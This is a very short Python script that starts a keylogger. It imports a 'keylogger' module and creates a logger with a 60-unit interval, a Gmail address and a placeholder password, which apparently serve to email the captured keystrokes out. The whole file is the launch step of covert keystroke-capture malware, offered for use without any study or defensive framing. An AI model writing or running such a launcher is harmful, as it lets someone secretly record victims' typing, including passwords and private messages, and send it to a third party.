#!/usr/bin/env python

import keylogger

my_keylogger = keylogger.Keylogger(60, "mail@gmail.com", "password1234")
my_keylogger.start()
